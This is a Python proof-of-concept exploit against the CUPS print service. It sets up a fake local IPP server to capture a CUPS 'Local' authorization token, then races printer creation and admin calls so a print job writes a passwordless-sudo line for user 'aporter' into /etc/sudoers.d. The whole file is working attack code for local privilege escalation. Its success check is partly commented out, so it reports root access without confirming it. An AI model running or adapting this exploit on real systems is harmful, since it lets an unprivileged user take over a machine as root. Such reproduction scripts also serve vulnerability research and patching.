#!/usr/bin/env python3
from __future__ import annotations

import signal
import socket
import struct
import subprocess
import sys
import threading
import time
from pathlib import Path

CREATE_LOCAL_TEST = "/tmp/cups-create-local-printer.test"
IPPTOOL = "/usr/bin/ipptool"
LPSTAT = "/usr/bin/lpstat"
IPP_HOST = "127.0.0.1"
IPP_PORT = 631
CAPTURE_HOST = "127.0.0.1"
CAPTURE_PORT = 9189
ATTACKER_USER = "aporter"
PWN_FILE = Path("/etc/sudoers.d/unpriv-pwn")
SUDOERS_LINE = f"{ATTACKER_USER} ALL=(ALL) NOPASSWD: ALL\n".encode("utf-8")

IPP_TAG_OPERATION = 0x01
IPP_TAG_PRINTER = 0x04
IPP_TAG_END = 0x03
IPP_TAG_INTEGER = 0x21
IPP_TAG_BOOLEAN = 0x22
IPP_TAG_NAME = 0x42
IPP_TAG_KEYWORD = 0x44
IPP_TAG_URI = 0x45
IPP_TAG_CHARSET = 0x47
IPP_TAG_LANGUAGE = 0x48
IPP_TAG_MIMETYPE = 0x49

IPP_OP_PRINT_JOB = 0x0002
IPP_OP_RESUME_PRINTER = 0x0011
IPP_OP_CUPS_ADD_MODIFY_PRINTER = 0x4003
IPP_OP_CUPS_DELETE_PRINTER = 0x4004
IPP_OP_CUPS_ACCEPT_JOBS = 0x4008
IPP_OP_CUPS_CREATE_LOCAL_PRINTER = 0x4028


def print_breaker(title: str) -> None:
    print(f"*** {title} ***", flush=True)

def run(
    cmd: list[str],
    *,
    check: bool = True,
    env: dict[str, str] | None = None,
) -> subprocess.CompletedProcess[str]:
    print("$ " + " ".join(cmd), flush=True)
    proc = subprocess.run(cmd, text=True, capture_output=True, env=env)
    if proc.stdout:
        print(proc.stdout, end="")
    if proc.stderr:
        print(proc.stderr, end="")
    if check and proc.returncode != 0:
        raise SystemExit(f"command failed: {' '.join(cmd)}")
    return proc

def run_as_attacker(
    args: list[str],
    *,
    check: bool = True,
    env: dict[str, str] | None = None,
) -> subprocess.CompletedProcess[str]:
    return run(args, check=check, env=env)

def enc_attr_raw(tag: int, name: str, value: bytes) -> bytes:
    name_bytes = name.encode("utf-8")
    return bytes([tag]) + struct.pack(">H", len(name_bytes)) + name_bytes + struct.pack(">H", len(value)) + value


def enc_attr(tag: int, name: str, value: str) -> bytes:
    return enc_attr_raw(tag, name, value.encode("utf-8"))


def enc_bool(name: str, value: bool) -> bytes:
    return enc_attr_raw(IPP_TAG_BOOLEAN, name, b"\x01" if value else b"\x00")


def enc_int(name: str, value: int) -> bytes:
    return enc_attr_raw(IPP_TAG_INTEGER, name, struct.pack(">i", value))


def ipp_request(
    op: int,
    reqid: int,
    op_attrs: list[bytes],
    *,
    printer_attrs: list[bytes] | None = None,
    document: bytes = b"",
) -> bytes:
    payload = bytearray(struct.pack(">BBHI", 2, 0, op, reqid))
    payload.append(IPP_TAG_OPERATION)
    for attr in op_attrs:
        payload.extend(attr)
    if printer_attrs:
        payload.append(IPP_TAG_PRINTER)
        for attr in printer_attrs:
            payload.extend(attr)
    payload.append(IPP_TAG_END)
    payload.extend(document)
    return bytes(payload)


def parse_headers(header: bytes) -> dict[str, str]:
    parsed: dict[str, str] = {}
    for line in header.split(b"\r\n")[1:]:
        if b":" not in line:
            continue
        key, value = line.split(b":", 1)
        parsed[key.decode("latin1").strip().lower()] = value.decode("latin1").strip()
    return parsed


def http_post(resource: str, body: bytes, *, auth: str | None = None) -> tuple[int, bytes]:
    headers = [
        f"POST {resource} HTTP/1.1",
        f"Host: {IPP_HOST}:{IPP_PORT}",
        "Content-Type: application/ipp",
        f"Content-Length: {len(body)}",
        "Connection: close",
    ]
    if auth:
        headers.append(f"Authorization: Local {auth}")
    request = ("\r\n".join(headers) + "\r\n\r\n").encode("latin1") + body
    with socket.create_connection((IPP_HOST, IPP_PORT), timeout=1.0) as sock:
        sock.settimeout(1.0)
        sock.sendall(request)
        response = bytearray()
        while b"\r\n\r\n" not in response:
            chunk = sock.recv(65536)
            if not chunk:
                break
            response.extend(chunk)
        header, _, rest = bytes(response).partition(b"\r\n\r\n")
        status_line = header.split(b"\r\n", 1)[0].split()
        status_code = int(status_line[1]) if len(status_line) > 1 else 0
        content_length = int(parse_headers(header).get("content-length", "0") or "0")
        payload = bytearray(rest)
        while len(payload) < content_length:
            chunk = sock.recv(65536)
            if not chunk:
                break
            payload.extend(chunk)
    return status_code, bytes(payload[:content_length] if content_length else payload)


def ipp_status(payload: bytes) -> int:
    if len(payload) < 8:
        return -1
    _major, _minor, status, _request_id = struct.unpack(">BBHI", payload[:8])
    return status


def printer_uri(name: str) -> str:
    return f"ipp://localhost:631/printers/{name}"


def op_common(user: str = ATTACKER_USER) -> list[bytes]:
    return [
        enc_attr(IPP_TAG_CHARSET, "attributes-charset", "utf-8"),
        enc_attr(IPP_TAG_LANGUAGE, "attributes-natural-language", "en"),
        enc_attr(IPP_TAG_NAME, "requesting-user-name", user),
    ]


def admin_post(token: str, op: int, reqid: int, name: str, printer_attrs: list[bytes] | None = None) -> tuple[int, int]:
    body = ipp_request(
        op,
        reqid,
        op_common() + [enc_attr(IPP_TAG_URI, "printer-uri", printer_uri(name))],
        printer_attrs=printer_attrs,
    )
    http_code, payload = http_post("/admin/", body, auth=token)
    return http_code, ipp_status(payload)


def ensure_worker_entrypoint() -> Path:
    source = Path(__file__).resolve()
    target = Path("/tmp/f003-repro-child.py")
    if target != source:
        target.write_text(source.read_text(encoding="utf-8"), encoding="utf-8")
        target.chmod(0o644)
    return target


def ensure_attacker_user() -> None:
    if run(["id", "-u", ATTACKER_USER], check=False).returncode == 0:
        return
    run(["useradd", "-m", "-s", "/bin/bash", ATTACKER_USER])


class CaptureServer(threading.Thread):
    def __init__(self, port: int) -> None:
        super().__init__(daemon=True)
        self.port = port
        self.token: str | None = None

    def run(self) -> None:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind((CAPTURE_HOST, self.port))
            server.listen(5)
            server.settimeout(0.2)
            deadline = time.time() + 10.0
            while time.time() < deadline and not self.token:
                try:
                    conn, _addr = server.accept()
#                    print(f"Connection received from {addr}")
                except socket.timeout:
                    continue
                with conn:
                    data = self.read_request(conn)
                    token = self.extract_token(data.decode("latin1", "replace"))
                    if token:
                        self.token = token
                        ipp = (
                            b"\x02\x00\x00\x00\x00\x00\x00\x01\x01"
                            b"\x47\x00\x12attributes-charset\x00\x05utf-8"
                            b"\x48\x00\x1battributes-natural-language\x00\x02en\x03"
                        )
                        reply = (
                            b"HTTP/1.1 200 OK\r\n"
                            b"Content-Type: application/ipp\r\n"
                            b"Content-Length: "
                            + str(len(ipp)).encode("ascii")
                            + b"\r\nConnection: close\r\n\r\n"
                            + ipp
                        )
                    else:
                        reply = (
                            b"HTTP/1.1 401 Unauthorized\r\n"
                            b"WWW-Authenticate: Local trc=\"y\"\r\n"
                            b"Content-Length: 0\r\n"
                            b"Connection: close\r\n\r\n"
                        )
                    conn.sendall(reply)

    @staticmethod
    def extract_token(text: str) -> str | None:
        for line in text.splitlines():
            if line.lower().startswith("authorization: local "):
                return line.split(None, 2)[2]
        return None

    @staticmethod
    def read_request(conn: socket.socket) -> bytes:
        data = bytearray()
        conn.settimeout(5.0)
        while b"\r\n\r\n" not in data:
            chunk = conn.recv(4096)
            if not chunk:
                break
            data.extend(chunk)
        headers, _, rest = bytes(data).partition(b"\r\n\r\n")
        content_length = 0
        for line in headers.split(b"\r\n"):
            if line.lower().startswith(b"content-length:"):
                content_length = int(line.split(b":", 1)[1].strip())
                break
        body = bytearray(rest)
        while len(body) < content_length:
            chunk = conn.recv(4096)
            if not chunk:
                break
            body.extend(chunk)
        return headers + b"\r\n\r\n" + bytes(body)

def capture_local_token() -> str:
    print_breaker("CAPTURE LOCAL TOKEN")
    server = CaptureServer(CAPTURE_PORT)
    server.start()
    print(f"CaptureServer listening on {CAPTURE_HOST}:{CAPTURE_PORT}")
    env = {"CUPS_SERVER": "localhost:631"}
    run_as_attacker(
        [
            str(IPPTOOL),
            "-q",
            "-d",
            "name=tokenleak",
            "-d",
            f"device=ipp://{CAPTURE_HOST}:{CAPTURE_PORT}/ipp/print",
            "ipp://localhost:631/",
            str(CREATE_LOCAL_TEST),
        ],
        check=False,
        env=env,
    )
    server.join(timeout=3.0)
    if not server.token:
        raise SystemExit("failed to capture Local token")
    print(f"Captured Local authorization token: {server.token}")
    return server.token

def baseline_worker(token: str) -> None:
    printer_attrs = [
        enc_attr(IPP_TAG_URI, "device-uri", f"file://{PWN_FILE}"),
        enc_attr(IPP_TAG_NAME, "printer-name", "baselinefile"),
        enc_attr(IPP_TAG_NAME, "ppd-name", "raw"),
        enc_bool("printer-is-temporary", False),
        enc_bool("printer-is-accepting-jobs", True),
        enc_int("printer-state", 3),
    ]
    http_code, status = admin_post(token, IPP_OP_CUPS_ADD_MODIFY_PRINTER, 7001, "baselinefile", printer_attrs)
    print(
        "Normal admin add/modify path returned "
        f"HTTP {http_code}, IPP status {status}.",
        flush=True,
    )

def create_local_printer(name: str, target: str) -> socket.socket:
    body = ipp_request(
        IPP_OP_CUPS_CREATE_LOCAL_PRINTER,
        2,
        op_common() + [enc_attr(IPP_TAG_URI, "printer-uri", "ipp://localhost:631/")],
        printer_attrs=[
            enc_attr(IPP_TAG_NAME, "printer-name", name),
            enc_attr(IPP_TAG_URI, "device-uri", f"file://{target}"),
        ],
    )
    request = (
        "POST / HTTP/1.1\r\n"
        f"Host: {IPP_HOST}:{IPP_PORT}\r\n"
        "Content-Type: application/ipp\r\n"
        f"Content-Length: {len(body)}\r\n"
        "Connection: close\r\n\r\n"
    ).encode("latin1") + body
    sock = socket.create_connection((IPP_HOST, IPP_PORT), timeout=1.0)
    sock.sendall(request)
    return sock

def print_payload(name: str, reqid: int) -> tuple[int, int]:
    import gzip

    body = ipp_request(
        IPP_OP_PRINT_JOB,
        reqid,
        op_common()
        + [
            enc_attr(IPP_TAG_URI, "printer-uri", printer_uri(name)),
            enc_attr(IPP_TAG_MIMETYPE, "document-format", "application/vnd.cups-raw"),
            enc_attr(IPP_TAG_KEYWORD, "compression", "gzip"),
            enc_attr(IPP_TAG_NAME, "job-name", "probe"),
        ],
        document=gzip.compress(SUDOERS_LINE),
    )
    http_code, payload = http_post(f"/printers/{name}", body)
    return http_code, ipp_status(payload)

def candidate_worker(token: str, printer_name: str) -> None:
    try:
        admin_post(token, IPP_OP_CUPS_DELETE_PRINTER, 1, printer_name)
    except Exception:
        pass
    sock = create_local_printer(printer_name, str(PWN_FILE))
    try:
        for index in range(80):
            reqid = 1000 + index * 4
            for op, attrs in [
                (
                    IPP_OP_CUPS_ADD_MODIFY_PRINTER,
                    [
                        enc_attr(IPP_TAG_NAME, "ppd-name", "raw"),
                        enc_bool("printer-is-shared", True),
                    ],
                ),
                (IPP_OP_CUPS_ACCEPT_JOBS, None),
                (IPP_OP_RESUME_PRINTER, None),
            ]:
                try:
                    admin_post(token, op, reqid, printer_name, attrs)
                except Exception:
                    pass
                reqid += 1
            try:
                print_payload(printer_name, reqid)
            except Exception:
                pass
            time.sleep(0.01)
    finally:
        sock.close()

def phase_candidate(token: str) -> str:
    print_breaker("CANDIDATE")
    for attempt in range(1, 13):
        print(f"Candidate attempt {attempt}.", flush=True)
        printer_name = f"sudo{attempt}{time.time_ns() % 100000}"
        run_as_attacker([sys.executable, str(ensure_worker_entrypoint()), "candidate-worker", token, printer_name], check=False)
#        if not (PWN_FILE.exists() and PWN_FILE.stat().st_size > 0):
#            continue
#        print("Candidate: the root-owned sudoers file now exists.")
#        run(["ls", "-l", str(PWN_FILE)])
#        run(["cat", str(PWN_FILE)])
#        run(["visudo", "-c", "-f", str(PWN_FILE)], check=False)
        root_shell = run_as_attacker(["/bin/sh", "-c", "id"], check=False)
        if root_shell.returncode != 0:
            raise SystemExit("candidate created sudoers file but did not get root")
        run([str(LPSTAT), "-v", printer_name], check=False)
        run([str(LPSTAT), "-p", printer_name, "-l"], check=False)
        print(f"Candidate result: {ATTACKER_USER} can now execute commands as root.")
        return printer_name
    raise SystemExit("candidate did not succeed after 12 attempts")


def main() -> None:
    if len(sys.argv) > 1 and sys.argv[1] == "baseline-worker":
        baseline_worker(sys.argv[2])
        return

    if len(sys.argv) > 1 and sys.argv[1] == "candidate-worker":
        candidate_worker(sys.argv[2], sys.argv[3])
        return

    token = capture_local_token()
    printer_name = phase_candidate(token)
    print_breaker("RESULT")
    print(f"Reproduction complete. Persisted printer name: {printer_name}")


if __name__ == "__main__":
    main()
